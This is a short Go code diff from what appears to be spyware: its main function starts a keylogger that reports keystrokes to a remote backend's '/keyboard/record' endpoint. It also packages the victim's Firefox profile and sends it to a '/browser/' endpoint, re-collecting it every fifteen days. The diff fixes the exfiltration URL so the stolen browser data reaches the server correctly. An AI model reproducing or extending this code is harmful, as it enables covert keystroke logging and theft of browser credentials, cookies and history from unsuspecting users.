@@ -107,13 +107,13 @@ func main() {
 	go hitboard.KeyBoardCollection("http://" + conf.Url + backendAddr + "/keyboard/record")
 	if lib.FileExits(lib.Firefoxpath) == nil {
 		if lib.FileExits(lib.Firefox) != nil {
-			go browser.Firefoxpack(conf.Url + backendAddr)
+			go browser.Firefoxpack("http://" + conf.Url + backendAddr + "/browser/")
 		} else {
 			//exits check date updae
 			logf, _ := os.Stat(lib.Firefox)
 			if time.Now().Unix()-logf.ModTime().Unix() >= 1296000 {
 				os.RemoveAll(lib.Firefox)
-				go browser.Firefoxpack(conf.Url + backendAddr)
+				go browser.Firefoxpack("http://" + conf.Url + backendAddr + "/browser/")
 			}
 		}
 	}
